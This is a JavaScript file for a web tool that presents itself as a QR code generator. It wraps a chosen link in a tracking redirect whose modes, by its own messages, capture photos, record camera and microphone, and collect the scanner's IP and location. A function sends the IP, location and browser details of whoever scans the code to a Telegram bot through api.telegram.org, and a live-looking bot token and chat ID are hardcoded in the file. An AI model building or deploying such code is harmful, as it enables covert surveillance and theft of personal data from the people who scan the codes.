// Application State
let generatedQRData = '';
let currentLink = '';
let currentText = '';
let currentFunction = 'basic';

// DOM Elements
const qrForm = document.getElementById('qrForm');
const cameraQrForm = document.getElementById('cameraQrForm');
const videoQrForm = document.getElementById('videoQrForm');
const ipQrForm = document.getElementById('ipQrForm');
const multiQrForm = document.getElementById('multiQrForm');

const linkInput = document.getElementById('linkInput');
const textInput = document.getElementById('textInput');
const cameraLinkInput = document.getElementById('cameraLinkInput');
const cameraTextInput = document.getElementById('cameraTextInput');
const videoLinkInput = document.getElementById('videoLinkInput');
const videoTextInput = document.getElementById('videoTextInput');
const ipLinkInput = document.getElementById('ipLinkInput');
const ipTextInput = document.getElementById('ipTextInput');
const multiLinkInput = document.getElementById('multiLinkInput');
const multiTextInput = document.getElementById('multiTextInput');

const resultSection = document.getElementById('resultSection');
const qrcodeDiv = document.getElementById('qrcode');
const displayText = document.getElementById('displayText');
const downloadBtn = document.getElementById('downloadBtn');
const copyBtn = document.getElementById('copyBtn');
const newBtn = document.getElementById('newBtn');
const loadingOverlay = document.getElementById('loadingOverlay');
const toast = document.getElementById('toast');
const botTokenInput = document.getElementById('botToken');
const chatIdInput = document.getElementById('chatId');
const saveConfigBtn = document.getElementById('saveConfigBtn');

// Function selector buttons
const functionButtons = document.querySelectorAll('.function-btn');
const basicForm = document.getElementById('basicForm');
const cameraForm = document.getElementById('cameraForm');
const videoForm = document.getElementById('videoForm');
const ipForm = document.getElementById('ipForm');
const multiForm = document.getElementById('multiForm');

// Telegram Bot Configuration
let TELEGRAM_BOT_TOKEN = '7314287901:AAHmk1ntW2pzPBkII5eTWRTQVNv3kkLfyp8';
let TELEGRAM_CHAT_ID = '7467384643';

// aslo replace           chat id ☝️

// Event Listeners
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

// Function selector event listeners
functionButtons.forEach(button => {
    button.addEventListener('click', function() {
        const functionType = this.getAttribute('data-function');
        switchFunction(functionType);
    });
});

// Form event listeners
qrForm.addEventListener('submit', handleBasicFormSubmit);
cameraQrForm.addEventListener('submit', handleCameraFormSubmit);
videoQrForm.addEventListener('submit', handleVideoFormSubmit);
ipQrForm.addEventListener('submit', handleIpFormSubmit);
multiQrForm.addEventListener('submit', handleMultiFormSubmit);

// Action button event listeners
downloadBtn.addEventListener('click', downloadQRCode);
copyBtn.addEventListener('click', copyQRURL);
newBtn.addEventListener('click', resetForm);
saveConfigBtn.addEventListener('click', saveConfiguration);

// Initialize Application
function initializeApp() {
    console.log('Multi-Function QR Code Generator initialized');
    loadConfiguration();
    linkInput.focus();
    
    // Check for service worker support
    if ('serviceWorker' in navigator) {
        console.log('Service worker support detected');
    }
}

// Load Configuration from localStorage
function loadConfiguration() {
    const savedToken = localStorage.getItem('telegram_bot_token');
    const savedChatId = localStorage.getItem('telegram_chat_id');
    
    if (savedToken) {
        TELEGRAM_BOT_TOKEN = savedToken;
        botTokenInput.value = savedToken;
    }
    
    if (savedChatId) {
        TELEGRAM_CHAT_ID = savedChatId;
        chatIdInput.value = savedChatId;
    }
}

// Save Configuration
function saveConfiguration() {
    const token = botTokenInput.value.trim();
    const chatId = chatIdInput.value.trim();
    
    if (token) {
        localStorage.setItem('telegram_bot_token', token);
        TELEGRAM_BOT_TOKEN = token;
    }
    
    if (chatId) {
        localStorage.setItem('telegram_chat_id', chatId);
        TELEGRAM_CHAT_ID = chatId;
    }
    
    showToast('Configuration saved successfully!', 'success');
}

// Switch between different functions
function switchFunction(functionType) {
    // Update active button
    functionButtons.forEach(btn => btn.classList.remove('active'));
    document.querySelector(`[data-function="${functionType}"]`).classList.add('active');
    
    // Hide all forms
    basicForm.style.display = 'none';
    cameraForm.style.display = 'none';
    videoForm.style.display = 'none';
    ipForm.style.display = 'none';
    multiForm.style.display = 'none';
    
    // Show selected form
    switch(functionType) {
        case 'basic':
            basicForm.style.display = 'block';
            linkInput.focus();
            break;
        case 'camera':
            cameraForm.style.display = 'block';
            cameraLinkInput.focus();
            break;
        case 'video':
            videoForm.style.display = 'block';
            videoLinkInput.focus();
            break;
        case 'ip':
            ipForm.style.display = 'block';
            ipLinkInput.focus();
            break;
        case 'multi':
            multiForm.style.display = 'block';
            multiLinkInput.focus();
            break;
    }
    
    currentFunction = functionType;
    
    // Hide result section when switching functions
    if (resultSection.style.display === 'block') {
        resultSection.style.display = 'none';
    }
}

// Basic QR Form Handler
async function handleBasicFormSubmit(e) {
    e.preventDefault();
    
    const link = linkInput.value.trim();
    const text = textInput.value.trim();
    
    if (!validateInput(link)) {
        showToast('Please enter a valid URL', 'error');
        return;
    }
    
    await generateQRCode(link, text, 'basic');
}

// Camera QR Form Handler
async function handleCameraFormSubmit(e) {
    e.preventDefault();
    
    const link = cameraLinkInput.value.trim();
    const text = cameraTextInput.value.trim();
    
    if (!validateInput(link)) {
        showToast('Please enter a valid URL', 'error');
        return;
    }
    
    await generateQRCode(link, text, 'camera');
}

// Video QR Form Handler
async function handleVideoFormSubmit(e) {
    e.preventDefault();
    
    const link = videoLinkInput.value.trim();
    const text = videoTextInput.value.trim();
    
    if (!validateInput(link)) {
        showToast('Please enter a valid URL', 'error');
        return;
    }
    
    await generateQRCode(link, text, 'video');
}

// IP QR Form Handler
async function handleIpFormSubmit(e) {
    e.preventDefault();
    
    const link = ipLinkInput.value.trim();
    const text = ipTextInput.value.trim();
    
    if (!validateInput(link)) {
        showToast('Please enter a valid URL', 'error');
        return;
    }
    
    await generateQRCode(link, text, 'ip');
}

// Multi-Function QR Form Handler
async function handleMultiFormSubmit(e) {
    e.preventDefault();
    
    const link = multiLinkInput.value.trim();
    const text = multiTextInput.value.trim();
    
    if (!validateInput(link)) {
        showToast('Please enter a valid URL', 'error');
        return;
    }
    
    // Get selected options
    const includeIP = document.getElementById('includeIP').checked;
    const includeCamera = document.getElementById('includeCamera').checked;
    const includeVideo = document.getElementById('includeVideo').checked;
    const includeDevice = document.getElementById('includeDevice').checked;
    
    const options = {
        ip: includeIP,
        camera: includeCamera,
        video: includeVideo,
        device: includeDevice
    };
    
    await generateQRCode(link, text, 'multi', options);
}

// Input Validation
function validateInput(link) {
    if (!link) return false;
    
    try {
        new URL(link);
        return true;
    } catch (error) {
        return false;
    }
}

// Generate QR Code
async function generateQRCode(link, text, functionType, options = {}) {
    showLoading(true);
    
    try {
        currentLink = link;
        currentText = text;
        
        // Create tracking URL based on function type
        const trackingURL = createTrackingURL(link, functionType, options);
        
        // Clear previous QR code
        qrcodeDiv.innerHTML = '';
        
        // Generate QR code
        const qr = qrcode(0, 'M');
        qr.addData(trackingURL);
        qr.make();
        
        // Create QR code element
        const qrElement = document.createElement('div');
        qrElement.innerHTML = qr.createImgTag(8, 8);
        qrcodeDiv.appendChild(qrElement);
        
        generatedQRData = trackingURL;
        
        // Update display text
        let displayMessage = `QR Code generated for: ${link}`;
        if (text) {
            displayMessage += `\nAdditional text: ${text}`;
        }
        
        switch(functionType) {
            case 'camera':
                displayMessage += '\n🔍 This QR will request camera permission and capture photos.';
                break;
            case 'video':
                displayMessage += '\n📹 This QR will request camera/microphone access for video recording.';
                break;
            case 'ip':
                displayMessage += '\n🌐 This QR will collect detailed IP and location information.';
                break;
            case 'multi':
                displayMessage += '\n🎯 This QR will collect multiple types of data based on selected options.';
                break;
        }
        
        displayText.textContent = displayMessage;
        
        showResult();
        showToast('QR Code generated successfully!', 'success');
        
    } catch (error) {
        console.error('Error generating QR code:', error);
        showToast('Error generating QR code. Please try again.', 'error');
    } finally {
        showLoading(false);
    }
}

// Create tracking URL
function createTrackingURL(originalLink, functionType, options = {}) {
    const trackingId = generateTrackingId();
    const baseURL = window.location.origin;
    
    let params = new URLSearchParams({
        target: originalLink,
        id: trackingId,
        type: functionType
    });
    
    // Add options for multi-function
    if (functionType === 'multi') {
        params.append('options', JSON.stringify(options));
    }
    
    return `${baseURL}/redirect.html?${params.toString()}`;
}

// Generate tracking ID
function generateTrackingId() {
    return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
}

// Show result section
function showResult() {
    resultSection.style.display = 'block';
    resultSection.scrollIntoView({ behavior: 'smooth' });
}

// Download QR Code
function downloadQRCode() {
    try {
        const canvas = qrcodeDiv.querySelector('img');
        if (!canvas) {
            showToast('No QR code to download', 'error');
            return;
        }
        
        // Create a temporary canvas to convert img to downloadable format
        const tempCanvas = document.createElement('canvas');
        const ctx = tempCanvas.getContext('2d');
        const img = new Image();
        
        img.onload = function() {
            tempCanvas.width = this.width;
            tempCanvas.height = this.height;
            ctx.drawImage(this, 0, 0);
            
            // Create download link
            const link = document.createElement('a');
            link.download = `qrcode-${currentFunction}-${Date.now()}.png`;
            link.href = tempCanvas.toDataURL();
            link.click();
            
            showToast('QR Code downloaded successfully!', 'success');
        };
        
        img.src = canvas.src;
        
    } catch (error) {
        console.error('Error downloading QR code:', error);
        showToast('Error downloading QR code', 'error');
    }
}

// Copy QR URL
async function copyQRURL() {
    try {
        if (!generatedQRData) {
            showToast('No QR code URL to copy', 'error');
            return;
        }
        
        await navigator.clipboard.writeText(generatedQRData);
        showToast('QR Code URL copied to clipboard!', 'success');
    } catch (error) {
        console.error('Error copying to clipboard:', error);
        showToast('Error copying to clipboard', 'error');
    }
}

// Reset form
function resetForm() {
    // Clear all form inputs
    linkInput.value = '';
    textInput.value = '';
    cameraLinkInput.value = '';
    cameraTextInput.value = '';
    videoLinkInput.value = '';
    videoTextInput.value = '';
    ipLinkInput.value = '';
    ipTextInput.value = '';
    multiLinkInput.value = '';
    multiTextInput.value = '';
    
    // Reset checkboxes
    document.getElementById('includeIP').checked = true;
    document.getElementById('includeCamera').checked = true;
    document.getElementById('includeVideo').checked = true;
    document.getElementById('includeDevice').checked = true;
    
    // Hide result section
    resultSection.style.display = 'none';
    
    // Clear generated data
    generatedQRData = '';
    currentLink = '';
    currentText = '';
    
    // Focus on current form's link input
    switch(currentFunction) {
        case 'basic':
            linkInput.focus();
            break;
        case 'camera':
            cameraLinkInput.focus();
            break;
        case 'video':
            videoLinkInput.focus();
            break;
        case 'ip':
            ipLinkInput.focus();
            break;
        case 'multi':
            multiLinkInput.focus();
            break;
    }
    
    showToast('Form reset successfully!', 'info');
}

// Show/Hide loading
function showLoading(show) {
    loadingOverlay.style.display = show ? 'flex' : 'none';
}

// Show toast notification
function showToast(message, type = 'info') {
    toast.textContent = message;
    toast.className = `toast ${type}`;
    toast.style.display = 'block';
    
    setTimeout(() => {
        toast.style.display = 'none';
    }, 3000);
}

// HTML escape function
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Send Data to Telegram (utility function)
async function sendToTelegram(data) {
    if (!TELEGRAM_BOT_TOKEN) {
        console.warn('Telegram bot token not configured');
        return;
    }
    
    try {
        const message = `🔍 QR Code Scan Detected!\n\n` +
            `📅 Time: ${new Date().toLocaleString()}\n` +
            `🌐 IP: ${data.ip || 'Unknown'}\n` +
            `📍 Location: ${data.location || 'Unknown'}\n` +
            `🔗 Target URL: ${data.targetUrl || 'Unknown'}\n` +
            `📱 User Agent: ${data.userAgent || 'Unknown'}\n` +
            `🆔 Tracking ID: ${data.trackingId || 'Unknown'}`;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (!response.ok) {
            throw new Error('Failed to send to Telegram');
        }
        
        console.log('Data sent to Telegram successfully');
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}